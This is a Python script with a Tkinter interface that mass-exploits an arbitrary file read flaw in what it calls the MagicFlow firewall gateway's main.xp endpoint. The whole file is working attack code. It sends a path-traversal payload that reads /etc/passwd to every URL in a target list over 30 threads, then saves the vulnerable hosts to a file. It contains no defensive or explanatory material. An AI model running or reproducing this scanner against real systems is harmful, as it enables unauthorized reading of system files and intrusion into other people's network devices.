import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def magicflow_readfile_exp(url):
    poc = r"""/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "root" in res.text:
            magicflow_readfile_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            magicflow_readfile_text.see(END)
            with open ("存在MagicFlow 防火墙网关 main.xp 任意文件读取漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            magicflow_readfile_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            magicflow_readfile_text.see(END)
    except Exception as err:
        magicflow_readfile_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        magicflow_readfile_text.see(END)
def get_magicflow_readfile_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def magicflow_readfile_gui():
    magicflow_readfile = tk.Tk()
    magicflow_readfile.geometry("910x450")
    magicflow_readfile.title("MagicFlow 防火墙网关 main.xp 任意文件读取漏洞一把梭")
    magicflow_readfile.resizable(0, 0)
    magicflow_readfile.iconbitmap('logo.ico')
    global magicflow_readfile_text
    magicflow_readfile_text = scrolledtext.ScrolledText(magicflow_readfile,width=123, height=25)
    magicflow_readfile_text.grid(row=0, column=0, padx=10, pady=10)
    magicflow_readfile_text.see(END)
    addrs = get_magicflow_readfile_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(magicflow_readfile_exp, addr)
    magicflow_readfile.mainloop()